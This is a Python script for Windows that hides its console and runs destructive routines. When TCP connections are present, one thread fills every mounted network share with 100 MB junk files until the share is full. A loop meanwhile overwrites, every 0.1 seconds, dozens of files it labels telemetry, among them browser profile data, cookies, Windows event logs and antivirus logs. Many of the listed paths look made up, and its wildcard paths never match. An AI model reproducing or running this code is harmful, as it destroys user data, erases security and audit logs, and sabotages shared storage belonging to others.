import ctypes
import sys
import os
import psutil
import random
import threading
import time

# Hide console window
if not sys.executable.endswith("pythonw.exe"):
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# Function to fill remote drives with garbage
def fill_remote_drive_with_garbage(file_size_mb=100):
    incoming_connections = psutil.net_connections(kind='tcp')
    if incoming_connections:
        print("Incoming connections detected. Filling remote drives with garbage data...")
        for drive in psutil.disk_partitions():
            if drive.mountpoint.startswith('\\\\'):
                print(f"Filling drive: {drive.mountpoint}")
                counter = 1
                while True:
                    file_path = os.path.join(drive.mountpoint, f"garbage_{counter}.dat")
                    try:
                        with open(file_path, 'wb') as f:
                            f.write(os.urandom(file_size_mb * 1024 * 1024))
                        print(f"Created garbage file: {file_path}")
                        counter += 1
                    except Exception as e:
                        print(f"Drive is full or an error occurred: {e}")
                        break
    else:
        print("No incoming connections detected.")

# Function to corrupt telemetry data
def corrupt_telemetry():
    # Comprehensive list of telemetry files from various companies
    target_files = [
        # Microsoft telemetry files
        os.path.join(os.environ.get("ProgramData", ""), "Microsoft", "Diagnosis", "ETLLogs", "AutoLogger", "AutoLogger-Diagtrack-Listener.etl"),
        os.path.join(os.environ.get("ProgramData", ""), "Microsoft", "Diagnosis", "ETLLogs", "AutoLogger", "AutoLogger-Diagtrack-Listener_1.etl"),
        os.path.join(os.environ.get("ProgramData", ""), "Microsoft", "Diagnosis", "ETLLogs", "ShutdownLogger.etl"),
        os.path.join(os.environ.get("LocalAppData", ""), "Microsoft", "Windows", "WebCache", "WebCacheV01.dat"),
        os.path.join(os.environ.get("ProgramData", ""), "Microsoft", "Windows", "AppRepository", "StateRepository-Deployment.srd"),
        os.path.join(os.environ.get("ProgramData", ""), "Microsoft", "Diagnosis", "eventTranscript", "eventTranscript.db"),
        os.path.join(os.environ.get("SystemRoot", ""), "System32", "winevt", "Logs", "Microsoft-Windows-Telemetry%4Operational.evtx"),
        os.path.join(os.environ.get("LocalAppData", ""), "Microsoft", "Edge", "User Data", "Default", "Preferences"),  # Edge telemetry

        # NVIDIA telemetry files
        os.path.join(os.environ.get("ProgramData", ""), "NVIDIA Corporation", "NvTelemetry", "NvTelemetryContainer.etl"),
        os.path.join(os.environ.get("ProgramFiles", ""), "NVIDIA Corporation", "NvContainer", "NvContainerTelemetry.etl"),

        # Google telemetry files (Chrome, Google services)
        os.path.join(os.environ.get("LocalAppData", ""), "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb", "*.log"),
        os.path.join(os.environ.get("LocalAppData", ""), "Google", "Chrome", "User Data", "EventLog", "*.etl"),
        os.path.join(os.environ.get("LocalAppData", ""), "Google", "Chrome", "User Data", "Default", "Web Data"),
        os.path.join(os.environ.get("ProgramFiles(x86)", ""), "Google", "Update", "GoogleUpdate.log"),  # Google Update telemetry

        # Adobe telemetry files
        os.path.join(os.environ.get("ProgramData", ""), "Adobe", "ARM", "log", "ARMTelemetry.etl"),
        os.path.join(os.environ.get("LocalAppData", ""), "Adobe", "Creative Cloud", "ACC", "logs", "CoreSync.log"),
        os.path.join(os.environ.get("ProgramFiles", ""), "Common Files", "Adobe", "OOBE", "PDApp.log"),

        # Intel telemetry files
        os.path.join(os.environ.get("ProgramData", ""), "Intel", "Telemetry", "IntelData.etl"),
        os.path.join(os.environ.get("ProgramFiles", ""), "Intel", "Driver Store", "Telemetry", "IntelGFX.etl"),
        os.path.join(os.environ.get("SystemRoot", ""), "System32", "DriverStore", "FileRepository", "igdlh64.inf_amd64_*", "IntelCPUTelemetry.dat"),

        # AMD telemetry files (Radeon software)
        os.path.join(os.environ.get("ProgramData", ""), "AMD", "CN", "AMDDiag.etl"),  # Radeon diagnostics
        os.path.join(os.environ.get("LocalAppData", ""), "AMD", "CN", "logs", "RadeonSoftware.log"),  # Radeon telemetry logs
        os.path.join(os.environ.get("ProgramFiles", ""), "AMD", "CNext", "CNext", "AMDTel.db"),  # AMD telemetry database

        # Steam telemetry files
        os.path.join(os.environ.get("ProgramFiles(x86)", ""), "Steam", "logs", "perf.log"),  # Performance telemetry
        os.path.join(os.environ.get("LocalAppData", ""), "Steam", "htmlcache", "Cookies"),  # Steam client telemetry
        os.path.join(os.environ.get("ProgramData", ""), "Steam", "SteamAnalytics.etl"),  # Steam analytics logs

        # Epic Games telemetry files
        os.path.join(os.environ.get("ProgramData", ""), "Epic", "EpicGamesLauncher", "Data", "EOSAnalytics.etl"),  # Epic Online Services telemetry
        os.path.join(os.environ.get("LocalAppData", ""), "EpicGamesLauncher", "Saved", "Logs", "EpicGamesLauncher.log"),  # Launcher telemetry

        # Discord telemetry files
        os.path.join(os.environ.get("LocalAppData", ""), "Discord", "app-*", "modules", "discord_analytics", "*.log"),  # Discord analytics logs
        os.path.join(os.environ.get("AppData", ""), "Discord", "Local Storage", "leveldb", "*.ldb"),  # Discord telemetry database

        # Autodesk telemetry files
        os.path.join(os.environ.get("LocalAppData", ""), "Autodesk", "Autodesk Desktop App", "Logs", "AdskDesktopAnalytics.log"),  # Desktop app telemetry
        os.path.join(os.environ.get("ProgramData", ""), "Autodesk", "Adlm", "Telemetry", "AdlmTelemetry.etl"),  # Licensing telemetry

        # Mozilla telemetry files (Firefox)
        os.path.join(os.environ.get("AppData", ""), "Mozilla", "Firefox", "Profiles", "*", "telemetry.sqlite"),  # Firefox telemetry database
        os.path.join(os.environ.get("LocalAppData", ""), "Mozilla", "Firefox", "Telemetry", "Telemetry.etl"),  # Firefox telemetry logs

        # Logitech telemetry files (Logi Options)
        os.path.join(os.environ.get("LocalAppData", ""), "Logitech", "LogiOptions", "logs", "LogiAnalytics.log"),  # Logitech analytics
        os.path.join(os.environ.get("ProgramData", ""), "Logitech", "LogiSync", "Telemetry.etl"),  # Logitech sync telemetry

        # Razer telemetry files
        os.path.join(os.environ.get("ProgramData", ""), "Razer", "Synapse3", "Logs", "RazerSynapse.log"),  # Synapse telemetry
        os.path.join(os.environ.get("LocalAppData", ""), "Razer", "Synapse", "Telemetry", "RazerTelemetry.etl"),  # Razer telemetry logs

        # Corsair telemetry files (iCUE)
        os.path.join(os.environ.get("ProgramData", ""), "Corsair", "CUE", "logs", "iCUETelemetry.log"),  # iCUE telemetry
        os.path.join(os.environ.get("LocalAppData", ""), "Corsair", "iCUE", "Analytics", "*.etl"),  # iCUE analytics logs

        # Antivirus telemetry files
        os.path.join(os.environ.get("ProgramData", ""), "Kaspersky Lab", "AVP*", "logs", "Telemetry.etl"),  # Kaspersky telemetry
        os.path.join(os.environ.get("ProgramData", ""), "McAfee", "Agent", "logs", "McTelemetry.log"),  # McAfee telemetry
        os.path.join(os.environ.get("ProgramData", ""), "Norton", "Norton", "Logs", "NortonAnalytics.etl"),  # Norton telemetry
        os.path.join(os.environ.get("ProgramFiles", ""), "Bitdefender", "Bitdefender Security", "logs", "BDTelemetry.db"),  # Bitdefender telemetry

        # Miscellaneous telemetry files
        os.path.join(os.environ.get("LocalAppData", ""), "Slack", "logs", "SlackAnalytics.log"),  # Slack telemetry
        os.path.join(os.environ.get("ProgramData", ""), "Dropbox", "client", "logs", "DropboxTelemetry.etl"),  # Dropbox telemetry
        os.path.join(os.environ.get("LocalAppData", ""), "Zoom", "logs", "ZoomAnalytics.log")  # Zoom telemetry
    ]

    def overwrite_file(file_path):
        if os.path.exists(file_path):
            try:
                # Get the file size
                size = os.path.getsize(file_path)
                # Generate random junk data of the same size
                junk = os.urandom(size)
                # Overwrite the file with junk data
                with open(file_path, 'wb') as f:
                    f.write(junk)
                print(f"Overwrote telemetry file: {file_path}")
            except Exception as e:
                print(f"Error overwriting {file_path}: {e}")
        else:
            print(f"File not found: {file_path}")

    # Infinite loop to continuously overwrite telemetry files
    while True:
        for file in target_files:
            overwrite_file(file)
        time.sleep(0.1)  # Small delay to prevent overwhelming the system

# Main function
def main():
    # Start filling remote drives with garbage in a separate thread
    threading.Thread(target=fill_remote_drive_with_garbage, daemon=True).start()

    # Start corrupting telemetry data in the main thread
    corrupt_telemetry()

if __name__ == "__main__":
    main()
